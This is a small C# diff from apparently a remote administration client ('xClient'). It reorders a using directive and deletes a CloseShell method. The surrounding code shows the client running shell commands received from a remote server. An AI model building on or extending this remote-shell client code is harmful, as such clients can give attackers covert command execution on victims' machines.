@@ -4,9 +4,9 @@ using System.IO;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
-using xClient.Core.RemoteShell;
 using xClient.Core.Helper;
 using System.Collections.Generic;
+using xClient.Core.RemoteShell;
 
 namespace xClient.Core.Commands
 {
@@ -68,11 +68,7 @@ namespace xClient.Core.Commands
                 _shell.ExecuteCommand(input);
         }
 
-        public static void CloseShell()
-        {
-            if (_shell != null)
-                _shell.Dispose();
-        }
+       
         public static void HandleOnJoin(Packets.ServerPackets.OnJoin command, Client client)
         {
             //MessageBox.Show("Received OnJoin");
